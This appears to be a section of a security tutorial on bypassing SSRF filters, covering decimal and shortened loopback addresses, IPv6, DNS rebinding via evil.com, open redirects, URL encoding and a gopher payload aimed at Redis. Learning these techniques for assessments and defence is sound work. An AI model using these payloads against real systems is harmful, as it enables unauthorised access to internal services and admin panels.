12. SSRF Bypass Techniques
Even when developers attempt to block SSRF, attackers often bypass filters using creative techniques.
Understanding these bypasses is extremely important in real-world security assessments and interviews.


12.1 Localhost Bypass
Applications often block:

127.0.0.1
localhost
Attackers can use alternative representations.
Alternative Loopback Formats

127.1
127.0.1
0.0.0.0
2130706433
Example:

http://2130706433/admin
Because 2130706433 = 127.0.0.1 in decimal format.


12.2 IPv6 Bypass
Filters may only check IPv4 addresses.
Example:

http://[::1]/admin
::1 is the IPv6 loopback address.


12.3 DNS Rebinding
In DNS rebinding, the attacker controls a domain that resolves to different IPs.
Step 1

evil.com → public IP
Step 2

evil.com → 127.0.0.1
Flow:

Attacker URL → Server resolves DNS → internal service
ASCII Example

Attacker
   |
   v
Application
   |
   v
evil.com
   |
   v
127.0.0.1 (after DNS change)
The application thinks it is accessing an external domain.


12.4 Open Redirect Abuse
If a domain is allowlisted but contains an open redirect, attackers can exploit it.
Example:

allowed-domain.com/redirect?url=http://127.0.0.1/admin
Server flow:

Application → allowed-domain.com → redirect → localhost
Now the internal request succeeds.


12.5 URL Encoding Tricks
Attackers encode blocked characters.
Example:

http://127.0.0.1
Encoded version:

http://127%2e0%2e0%2e1
Some filters fail to decode before validation.


12.6 Mixed Encoding
Example:

http://%31%32%37.0.0.1
This represents:

127.0.0.1


12.7 Protocol Bypass
Applications may only check for http and https.
But libraries may support other protocols.
Examples:

file://
ftp://
gopher://
dict://
Example payload:

gopher://127.0.0.1:6379/_INFO
This technique is used to exploit services like:
	• Redis
	• Memcached
	• SMTP


